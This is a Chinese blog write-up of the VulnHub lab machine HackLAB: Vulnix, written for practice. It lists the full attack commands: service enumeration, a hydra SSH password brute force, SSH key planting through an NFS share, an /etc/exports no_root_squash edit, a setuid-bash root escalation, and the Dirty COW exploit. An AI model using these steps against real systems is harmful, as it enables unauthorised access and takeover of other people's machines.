@@ -1,0 +1,260 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HackLAB-Vulnix | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="No.13">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackLAB-Vulnix">
+<meta property="og:url" content="https://4reexile.github.io/article/HackLAB-Vulnix/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="No.13">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2024-12-08T11:06:50.000Z">
+<meta property="article:modified_time" content="2024-12-08T11:10:47.034Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="爆破">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="SSH毒化">
+<meta property="article:tag" content="NFS挂载">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/HackLAB-Vulnix/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HackLAB-Vulnix',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-08 19:10:47'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HackLAB-Vulnix</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-12-08T11:06:50.000Z" title="Created 2024-12-08 19:06:50">2024-12-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-12-08T11:10:47.034Z" title="Updated 2024-12-08 19:10:47">2024-12-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/vulnhub%E9%9D%B6%E5%9C%BA/">vulnhub靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.9k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>HackLAB: Vulnix</h1>
+<hr>
+<blockquote>
+<p>来源: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacklab-vulnix,48/">vulnhub靶场-HackLAB: Vulnix</a></p>
+<p>目标: boot up, find the IP, hack away and obtain the trophy hidden away in /root by any means you wish – excluding the actual hacking of the vmdk</p>
+<p>提示: The host is based upon Ubuntu Server 12.04 and is fully patched as of early September 2012.</p>
+<p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+</blockquote>
+<h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2>
+<p>kali: 192.168.110.130</p>
+<p>target:192.168.110.132</p>
+<h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2>
+<p>作者在网站中给了我们一些信息: Ubuntu Server 12.04, x86架构</p>
+<p>nmap扫描可得:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.110.132</span><br><span class="line"></span><br><span class="line">22/tcp OpenSSH 5.9p1</span><br><span class="line">25/tcp Postfix smtpd</span><br><span class="line">79/tcp Linux fingerd</span><br><span class="line">110/tcp Dovecot pop3d </span><br><span class="line">111/tcp rpcbind</span><br><span class="line">143/tcp Dovecot imapd</span><br><span class="line">512/tcp etkit-rsh rexecd</span><br><span class="line">513/tcp login?</span><br><span class="line">514/tcp shell Netkit rshd</span><br><span class="line">993/tcp ssl/imap Dovecot imapd</span><br><span class="line">995/tcp ssl/pop3 Dovecot pop3d</span><br><span class="line">2049/tcp nfs</span><br></pre></td></tr></table></figure>
+<ul>
+<li>可能出现的信息泄露: smtp服务, finger, rpc</li>
+<li>可能利用的服务: nfs</li>
+</ul>
+<blockquote>
+<p>全是没见过的, 我建议搜是什么和怎么利用</p>
+</blockquote>
+<p>先来看看NFS: 通常结合Kerberos使用, 因为NFS 本身仅根据用户的UID/GID对用户进行身份验证; 一旦NFS文件系统被远程主机以读/写权限成功挂载, 每个共享文件的唯一保护就是它的权限</p>
+<p>由于目标没有Kerberos设置, 因此只需找到经过身份验证以使用NFS的用户的UID和GUID, 并创建具有相同UID和GUID的用户即可访问所有允许的文件</p>
+<p>我们需要登录/getshell才能收集信息, 所以我们分别使用对应工具进行信息收集</p>
+<ul>
+<li>smtp信息枚举用的smtp-user-enum命令(我这个跑不出来不知道为什么)</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali自带的字典</span></span><br><span class="line">smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.110.132</span><br><span class="line"><span class="comment"># -M    ---用于猜测用户名 EXPN、VRFY 或 RCPT 的方法（默认值：VRFY）</span></span><br><span class="line"><span class="comment"># -U    ---通过 smtp 服务检查的用户名文件</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>finger命令</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">finger user@192.168.110.132</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241203214950.png" alt="image.png"></p>
+<p>得到两个用户, 其中user的shell为/bin/bash说明可以登陆</p>
+<ul>
+<li>RPC枚举</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcinfo -p 192.168.110.132</span><br></pre></td></tr></table></figure>
+<p>和nmap差不多就不说了</p>
+<ul>
+<li>NFS枚举与挂载</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">showmount -e 192.168.110.132</span><br><span class="line"><span class="comment"># 得到挂载目录如下 /home/vulnix *</span></span><br><span class="line"><span class="comment"># 那么我们现在就把这个文件夹挂载到我们本地</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建个挂载目录</span></span><br><span class="line"><span class="built_in">mkdir</span> nfs   </span><br><span class="line"><span class="comment"># 挂载vulnix目录(记得用root权限)</span></span><br><span class="line">mount -t nfs 192.168.110.132:/home/vulnix /tmp/nfs  </span><br><span class="line"><span class="built_in">cd</span> nfs </span><br><span class="line"><span class="comment"># cd: permission denied: nfs</span></span><br></pre></td></tr></table></figure>
+<p>显示权限不够, 应该是设置了root_squash(后面读取配置, 确实如此)</p>
+<p>此时共享已经完成, 接下来只需要创建一个用户具有相同的id与gid用户即可</p>
+<h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2>
+<p>已知用户名, 那就利用rockyou密码本爆破; 可以得到<code>user</code>密码为<code>letmein</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate rockyou.txt</span><br><span class="line"><span class="comment"># /usr/share/wordlists/rockyou.txt.gz</span></span><br><span class="line">hydra -l user -P /home/kali/Desktop/tools/rockyou.txt 192.168.110.132 ssh -t 4</span><br></pre></td></tr></table></figure>
+<p>ssh连接即可</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh user@192.168.110.132</span><br><span class="line"><span class="comment"># letmein</span></span><br></pre></td></tr></table></figure>
+<h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="comment"># 查看vulnix的权限</span></span><br><span class="line"><span class="comment"># vulnix:x:2008:2008::/home/vulnix:/bin/bash</span></span><br></pre></td></tr></table></figure>
+<p>用户名: vulnx, 用户权限2008, 在kali上创建这个用户</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -u 2008 vulnix</span><br><span class="line"><span class="comment"># 切换这个用户</span></span><br><span class="line">su vulnix</span><br><span class="line"><span class="built_in">cd</span> nfs</span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line"><span class="built_in">df</span></span><br><span class="line"><span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure>
+<h2 id="ssh毒化"><a class="header-anchor" href="#ssh毒化">¶</a>ssh毒化</h2>
+<p>尝试ssh毒化(通过ssh写密钥来登录该用户)</p>
+<p>SSH密钥毒化指的是通过在目标系统中注入恶意的SSH密钥, 篡改或伪造SSH公钥身份验证的过程, 从而获得对目标系统的访问权限</p>
+<p>现在我们来写公钥来登录靶机的vulnix用户</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali在root权限生成rsa密钥对</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="built_in">cd</span> /root/.ssh </span><br><span class="line"><span class="comment"># 复制公钥</span></span><br><span class="line"><span class="built_in">cat</span> id_rsa.pub</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在共享目录下创建.ssh目录mkdir .ssh</span></span><br><span class="line">su vulnix</span><br><span class="line"><span class="built_in">cd</span> nfs</span><br><span class="line"><span class="built_in">mkdir</span> .ssh</span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;刚才id_rsa.pub的内容&#x27;</span> &gt; authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看/etc/ssh/sshd_config,发现配置项AuthorizedKeysFile是注释状态</span></span><br><span class="line"><span class="comment"># 下面这个是登录不了的,但是似乎不是配置问题</span></span><br><span class="line">ssh -i /root/.ssh/id_rsa vulnix@192.168.110.132</span><br><span class="line"><span class="comment"># 最后发现是因为openssh的问题,我们需要加上参数</span></span><br><span class="line">ssh -o <span class="string">&#x27;PubkeyAcceptedKeyTypes +ssh-rsa&#x27;</span> -i /root/.ssh/id_rsa vulnix@192.168.110.132</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241207213615.png" alt="image.png"></p>
+<h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2>
+<h3 id="sudo提权"><a class="header-anchor" href="#sudo提权">¶</a>sudo提权?</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 回显信息如下：</span></span><br><span class="line">User vulnix may run the following commands on this host:</span><br><span class="line">    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports</span><br><span class="line"><span class="comment"># 可以以root用户身份执行sudoedit /etc/exports</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/exports</span><br><span class="line"><span class="comment"># 似乎是nfs的配置文件, 其中有这么一条</span></span><br><span class="line"><span class="comment"># /home/vulnix	*(rw,root_squash)</span></span><br><span class="line"></span><br><span class="line">sudoedit /etc/exports  </span><br><span class="line"><span class="comment"># root权限编辑文件, 添加：/root *(rw,no_root_squash)</span></span><br><span class="line"><span class="comment"># 修改/home/vulnix那一条为no_root_squash</span></span><br><span class="line"><span class="comment"># 编辑方式为直接输入, ctrl+x退出,输入y然后回车即可保存</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241207220419.png" alt="image.png"></p>
+<blockquote>
+<p>root_squash: 客户端的root用户映射到任何人; 客户端无法使用setuid位将恶意软件留给他人执行</p>
+<p>no_root_squash: 通过此选项, 停用了此安全功能, 从而允许客户端的root权限操作最终以root身份出现在导出的文件系统中</p>
+<p>危害: 如果配置为no_root_squash, 远程 root 用户可以更改共享文件系统上的任何文件, 并留下被木马感染的应用程序, 让其他用户无意中执行。</p>
+</blockquote>
+<p>现在重启靶机, 让配置更改生效;</p>
+<p>为了防止你不知道为什么要像上下文这么做, 先解释一下:</p>
+<p>如果我们直接从本地传给靶机, 那么我们的shell是64位的, 与靶场的32位环境不兼容;</p>
+<p>如果是我们从靶场cp一个shell到他的挂载文件夹, 那么就是32位的, 因为那是他的原生shell; 但是这又会导致权限不足的问题, 那么我们再用root的kali把这个shell弄到另一个文件里, 那么因为是root执行的, 那么这个shell就会变成root</p>
+<p>而修改配置, 可以让我们<strong>以本地root的权限进入到共享目录中</strong>, 实现下面的操作</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">showmount -e 192.168.110.132</span><br><span class="line"><span class="comment"># 在kali将全部挂载删除</span></span><br><span class="line">umount /tmp/nfs</span><br><span class="line"><span class="comment"># 重新挂在到nfs目录下,此时本地root权限用户应该可以进入nfs文件夹</span></span><br><span class="line">mount -t nfs 192.168.110.132:/home/vulnix /tmp/nfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh登录靶机执行</span></span><br><span class="line">ssh -o <span class="string">&#x27;PubkeyAcceptedKeyTypes +ssh-rsa&#x27;</span> -i /root/.ssh/id_rsa vulnix@192.168.110.132</span><br><span class="line"><span class="built_in">cp</span> /bin/bash .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在kali的root权限下进入nfs文件夹将文件复制一次再赋权</span></span><br><span class="line"><span class="built_in">cat</span> bash &gt; <span class="built_in">test</span></span><br><span class="line"><span class="built_in">chmod</span> 4777 <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241208183750.png" alt="image.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 回到ssh登录的vulnix用户,以特权模式运行该bash</span></span><br><span class="line"><span class="comment"># 意思就是如果文件原权限为root,则特权模式下运行也为root</span></span><br><span class="line">./test -p</span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241208183533.png" alt="image.png"></p>
+<blockquote>
+<p>关于 -p 打开特权模式</p>
+<p>在此模式下, 不处理<code>$ENV</code>和<code>$BASH_ENV</code>文件, 不从环境继承shell函数, 并且如果 SHELLOPTS、BASHOPTS、CDPATH和GLOBIGNORE变量出现在环境中, 它们将被忽略;</p>
+<p>如果shell不等于真实用户(组)id的有效用户(组)id就会启动, 并且没有提供-p选项则执行这些操作并将有效用户id设置为真实用户ID; 如果在启动时提供了-p选项, 则不会重置有效的用户ID; 关闭此选项会导致有效用户和组ID设置为真实用户和组ID</p>
+</blockquote>
+<h3 id="给root写公钥"><a class="header-anchor" href="#给root写公钥">¶</a>给root写公钥</h3>
+<p>需要重启靶机(我们没有权限重启服务, 还是不如其他方法好)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudoedit /etc/exports</span><br><span class="line"><span class="comment"># 这个地方修改为/root, 然后保存重启环境(前面已经改了)</span></span><br><span class="line">showmount -e 192.168.110.132</span><br><span class="line"><span class="comment"># 这个时候就能看到root可以被挂载，然后我们直接挂</span></span><br><span class="line">mount -t nfs 192.168.110.132:/root /tmp/nfs</span><br><span class="line"><span class="comment"># 然后再跟之前一样的写公钥利用SSH登录即可</span></span><br></pre></td></tr></table></figure>
+<h3 id="dirty-cow漏洞利用"><a class="header-anchor" href="#dirty-cow漏洞利用">¶</a>dirty_cow漏洞利用</h3>
+<p>在kali搜索dirty cow即可拿到脚本40839.c, 编译后上传运行; 注意要同样的32位环境才能进行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit dirty cow</span><br><span class="line"><span class="comment"># Linux Kernel 2.6.22 &lt; 3.9 - &#x27;Dirty COW&#x27; &#x27;PTRACE_POKEDATA&#x27; Race Conditi | linux/local/40839.c</span></span><br></pre></td></tr></table></figure>
+<p>此脚本会将root用户典当为firefart用户!以firefart用户身份使用ssh登录：
+<code>ssh firefart@192.168.110.132</code>
+打开/etc/passwd文件 将firefart更改为root 再以root登录
+<code>ssh root@192.168.110.132</code></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/HackLAB-Vulnix/">https://4reexile.github.io/article/HackLAB-Vulnix/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%88%86%E7%A0%B4/">爆破</a><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a><a class="post-meta__tags" href="/tags/SSH%E6%AF%92%E5%8C%96/">SSH毒化</a><a class="post-meta__tags" href="/tags/NFS%E6%8C%82%E8%BD%BD/">NFS挂载</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/Wakanda-1/" title="Wakanda-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Wakanda-1</div></div></a></div><div class="next-post pull-right"><a href="/article/ctfshow-webbasic-blackbox/" title="Web入门_黑盒测试"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">Web入门_黑盒测试</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/Broken-Gallery/" title="Broken-Gallery"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-31</div><div class="title">Broken-Gallery</div></div></a></div><div><a href="/article/DerpNStink-1/" title="DerpNStink-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="title">DerpNStink-1</div></div></a></div><div><a href="/article/GoldenEye-1/" title="GoldenEye-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-05</div><div class="title">GoldenEye-1</div></div></a></div><div><a href="/article/Lampiao-1/" title="Lampiao-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-18</div><div class="title">Lampiao-1</div></div></a></div><div><a href="/article/Typhoon-1-02/" title="Typhoon-1.02"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-23</div><div class="title">Typhoon-1.02</div></div></a></div><div><a href="/article/dpwwn-2/" title="dpwwn-2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-08</div><div class="title">dpwwn-2</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">HackLAB: Vulnix</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">1.3.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-v2"><span class="toc-number">1.4.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E6%AF%92%E5%8C%96"><span class="toc-number">1.5.</span> <span class="toc-text">ssh毒化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.1.</span> <span class="toc-text">sudo提权?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99root%E5%86%99%E5%85%AC%E9%92%A5"><span class="toc-number">1.6.2.</span> <span class="toc-text">给root写公钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dirty-cow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.3.</span> <span class="toc-text">dirty_cow漏洞利用</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 